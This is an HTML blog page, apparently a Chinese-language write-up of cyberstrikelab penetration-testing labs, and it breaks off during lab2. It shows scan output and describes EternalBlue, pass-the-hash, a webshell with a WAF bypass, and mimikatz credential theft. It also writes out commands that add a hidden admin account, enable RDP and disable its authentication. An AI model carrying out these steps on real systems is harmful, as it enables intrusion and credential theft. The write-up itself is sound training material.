@@ -1,0 +1,1155 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/92be8204c485c8f6383d7346a7c613f8.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="lab1flag1D:\CTF-tool\network\fscan1.8.2&gt;fscan64.exe -h 192.168.10.0&#x2F;24     ___                              _   &#x2F; _ \     ___  ___ _ __ __ _  ___| | __  &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &amp;#x27;__&#x2F; _&#96; |&#x2F; __| |&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab-lab">
+<meta property="og:url" content="https://zer0peach.github.io/2025/05/08/cyberstrikelab-lab/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="lab1flag1D:\CTF-tool\network\fscan1.8.2&gt;fscan64.exe -h 192.168.10.0&#x2F;24     ___                              _   &#x2F; _ \     ___  ___ _ __ __ _  ___| | __  &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &amp;#x27;__&#x2F; _&#96; |&#x2F; __| |&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508234515340.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508234920432.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508235005827.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508235109285.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508235352281.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250509041719240.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250509041332274.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250510064600564.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250509033333147.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250510041520262.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250510042323370.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250510043522584.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250510063626414.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250512231510335.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250512231809991.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250512232135930.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014251553.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014343883.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014606520.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014635266.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014927978.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513014917959.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250513015124182.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515181214976.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515181629026.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182022592.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182628932.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182649414.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182700498.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182711919.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515182748090.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515185738231.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515200212213.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515200013438.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515200341970.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515200354450.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515200411594.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215029244.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215104547.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215302891.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215245989.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215452093.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215518775.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250515215527274.png">
+<meta property="article:published_time" content="2025-05-08T15:41:22.000Z">
+<meta property="article:modified_time" content="2025-05-16T12:56:22.469Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/cyberstrikelab-lab/image-20250508234515340.png">
+  
+  
+  
+  <title>cyberstrikelab-lab - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="cyberstrikelab-lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-08 23:41" pubdate>
+          2025年5月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          106 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">cyberstrikelab-lab</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>&gt;fscan64.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">2</span>
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.10:80</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">7</span>
+start vulscan
+<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">25229</span>  title:易优CMS -  Powered by Eyoucms.com
+<span class="hljs-string">[+]</span> http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span> poc-yaml-thinkphp5023-method-rce poc1</code></pre></div>
+
+<p>可以直接thinkphp5.0.23一把梭，但是我这个环境有问题，phpinfo有东西但页面显示不出来，命令执行更是没东西</p>
+<p>使用网上易优CMS的漏洞，前台getshell</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/121945304">EyouCms前台GetShell漏洞复现_eyoucms漏洞-CSDN博客</a></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250508234515340.png" srcset="/img/loading.gif" lazyload alt="image-20250508234515340"></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>由于这个是用openvpn，用着挺卡，代理工具传上去老超时，就不用frp了，换个工具</p>
+<p>打代理这一步卡拉我半个多小时</p>
+<p>代理上后，再扫</p>
+<div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.20.30:88</span> open
+<span class="hljs-number">192.168.20.10:3306</span> open
+<span class="hljs-number">192.168.20.30:445</span> open
+<span class="hljs-number">192.168.20.20:445</span> open
+<span class="hljs-number">192.168.20.10:445</span> open
+<span class="hljs-number">192.168.20.30:139</span> open
+<span class="hljs-number">192.168.20.20:139</span> open
+<span class="hljs-number">192.168.20.10:139</span> open
+<span class="hljs-number">192.168.20.30:135</span> open
+<span class="hljs-number">192.168.20.20:135</span> open
+<span class="hljs-number">192.168.20.10:135</span> open
+<span class="hljs-number">192.168.20.10:80</span> open
+<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">10</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">25157</span>  title:易优CMS -  Powered by Eyoucms.com
+<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">10</span>   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span> 
+<span class="hljs-string">[*]</span> NetInfo:
+<span class="hljs-string">[*]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>
+   <span class="hljs-string">[-&gt;]</span>WIN-7NRTJO59O7N
+   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>
+<span class="hljs-string">[*]</span> NetInfo:
+<span class="hljs-string">[*]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>
+   <span class="hljs-string">[-&gt;]</span>cyberweb
+   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>
+<span class="hljs-string">[+]</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>	MS17-<span class="hljs-number">010</span>	(Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>)
+<span class="hljs-string">[+]</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>	MS17-<span class="hljs-number">010</span>	(Windows Server <span class="hljs-number">2008</span> R2 Standard <span class="hljs-number">7600</span>)
+<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>   cyberweb.cyberstrikelab.com         Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span> 
+<span class="hljs-string">[+]</span> http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">10</span> poc-yaml-thinkphp5023-method-rce poc1
+</code></pre></div>
+
+<p>两个永痕之蓝，20.20的没成功，打20.30成功了</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250508234920432.png" srcset="/img/loading.gif" lazyload alt="image-20250508234920432"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250508235005827.png" srcset="/img/loading.gif" lazyload alt="image-20250508235005827"></p>
+<p>能够hashdump</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250508235109285.png" srcset="/img/loading.gif" lazyload alt="image-20250508235109285"></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>就直接pth直接拿下20.20</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250508235352281.png" srcset="/img/loading.gif" lazyload alt="image-20250508235352281"></p>
+<h1 id="pearl"><a href="#pearl" class="headerlink" title="pearl"></a>pearl</h1><h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>&gt;fscan64.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">65</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">3</span>
+<span class="hljs-number">192.168.10.65:135</span> open
+<span class="hljs-number">192.168.10.65:139</span> open
+<span class="hljs-number">192.168.10.65:445</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.42:22</span> open
+<span class="hljs-number">192.168.10.65:80</span> open
+<span class="hljs-number">192.168.10.65:3306</span> open
+<span class="hljs-number">192.168.10.42:3306</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">9</span>
+start vulscan
+<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">19</span>     title:None
+<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">65</span>   WORKGROUP\WIN-BVAJO3C2D90           Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">65</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">8460</span>   title:梦想cms（lmxcms）是一套完全免费、开源、无授权限制的网 站管理系统</code></pre></div>
+
+<p>梦想cms，查了下很多sql注入</p>
+<p>看文章拿sqlmap去跑，跑了贼久，没什么用</p>
+<p>看题目发现第二个flag才是sql flag，猜测后台肯定能登录</p>
+<p>弱密码admin&#x2F;admin123</p>
+<p>然后尝试文件读取都没用</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250509041719240.png" srcset="/img/loading.gif" lazyload alt="image-20250509041719240"></p>
+<p>看到篇命令执行的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14971">初入代码审计之lmxcms代码执行-先知社区 (aliyun.com)</a></p>
+<p>能够执行命令</p>
+<p>可以写马，但是访问会被安全狗拦截，搜了下绕过安全狗</p>
+<p>可以include去包含写的木马即可</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250509041332274.png" srcset="/img/loading.gif" lazyload alt="image-20250509041332274"></p>
+<p>发现是服务权限，直接拿potato提权，然后读flag即可</p>
+<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>说是sql flag，在数据库中没有找到东西</p>
+<p>但还有个10.42也有3306端口</p>
+<p>爆破弱密码，发现</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250510064600564.png" srcset="/img/loading.gif" lazyload alt="image-20250510064600564"></p>
+<p>（但是看了下wp发现其他人都是fscan扫出密码是123456）</p>
+<p>虽然得到密码，但是无法连接数据库</p>
+<p>挂上10.65的代理后仍然无法连接，不会了</p>
+<p>wp就是连接上后就得到flag</p>
+<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>C盘下有个rdp连接，需要administrator的密码</p>
+<p>可以解密凭据</p>
+<p>要用mimikatz，但是蚁剑不知道咋以管理员权限执行mimikatz</p>
+<p>所以开个3389端口先连接上10.65</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>hack 1qaz@WSX /<span class="hljs-built_in">add</span>
+net localgroup administrators hack /<span class="hljs-built_in">add</span>
+REG <span class="hljs-built_in">ADD</span> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow
+</code></pre></div>
+
+<p>还有个认证报错</p>
+<p>报错原因说是身份验证导致的，那么我们直接禁用掉身份验证就好了</p>
+<div class="code-wrapper"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0 /f</span></code></pre></div>
+
+
+
+<p><img src="/../images/cyberstrikelab-lab/image-20250509033333147.png" srcset="/img/loading.gif" lazyload alt="image-20250509033333147"></p>
+<p>连接上后，这个凭据的地方很神奇</p>
+<div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials</code></pre></div>
+
+<p>不是常规的administrator下的Credentials下</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250510041520262.png" srcset="/img/loading.gif" lazyload alt="image-20250510041520262"></p>
+<p>得到密码，然后点C盘下的rdp文件有一次远程连接</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250510042323370.png" srcset="/img/loading.gif" lazyload alt="image-20250510042323370"></p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>传工具，去扫</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250510043522584.png" srcset="/img/loading.gif" lazyload alt="image-20250510043522584"></p>
+<p>发现redis，可写定时任务</p>
+<p>但是由于多层代理配置的问题，没有完成后续</p>
+<p>但就是这个思路</p>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>题目提示密码是qwe开头，拿rockyou去爆破就行</p>
+<p>还以为像第三题一样再一次解密呢，这个密码啥用没有</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250510063626414.png" srcset="/img/loading.gif" lazyload alt="image-20250510063626414"></p>
+<p>得到密码就可以横向到10.0.0.23上了</p>
+<p>就是这个思路，就不打了，代理有点问题，传工具也挺麻烦的</p>
+<h1 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h1><div class="code-wrapper"><pre><code class="hljs accesslog">D:\CTF-tool\network\fscan1.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>&gt;fscan -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span>
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>
+start infoscan
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">20</span>   is alive
+(icmp) Target <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">233</span>  is alive
+<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">3</span>
+<span class="hljs-number">192.168.10.10:445</span> open
+<span class="hljs-number">192.168.10.20:445</span> open
+<span class="hljs-number">192.168.10.20:8080</span> open
+<span class="hljs-number">192.168.10.233:8080</span> open
+<span class="hljs-number">192.168.10.10:3306</span> open
+<span class="hljs-number">192.168.10.233:22</span> open
+<span class="hljs-number">192.168.10.10:808</span> open
+<span class="hljs-number">192.168.10.10:135</span> open
+<span class="hljs-number">192.168.10.20:135</span> open
+<span class="hljs-number">192.168.10.10:7680</span> open
+<span class="hljs-number">192.168.10.10:139</span> open
+<span class="hljs-number">192.168.10.20:139</span> open
+<span class="hljs-number">192.168.10.20:8009</span> open
+<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">13</span>
+start vulscan
+<span class="hljs-string">[*]</span> NetInfo
+<span class="hljs-string">[*]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>
